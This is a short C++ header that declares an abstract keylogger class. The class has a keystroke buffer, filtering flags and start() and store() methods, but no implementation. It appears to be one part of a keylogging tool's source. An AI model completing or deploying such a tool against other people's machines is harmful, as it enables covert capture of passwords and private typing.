#ifndef _KEYLOGGER_HPP_
#define _KEYLOGGER_HPP_

using namespace std;

class keylogger
{
    public :
      string m_buffer;
      size_t m_buffer_size;
      bool m_no_click;
      bool m_alphabet_only;
      bool m_store_character;

		keylogger();

		virtual ~keylogger();

    virtual void start();

		virtual void store() = 0;

    virtual void set_buffer_size(size_t p_new_buffer_size);

    virtual void set_no_click(bool p_no_click);

    virtual void set_alphabet_only(bool p_alphabet_only);

    virtual void set_store_character(bool p_store_character);
};

#endif
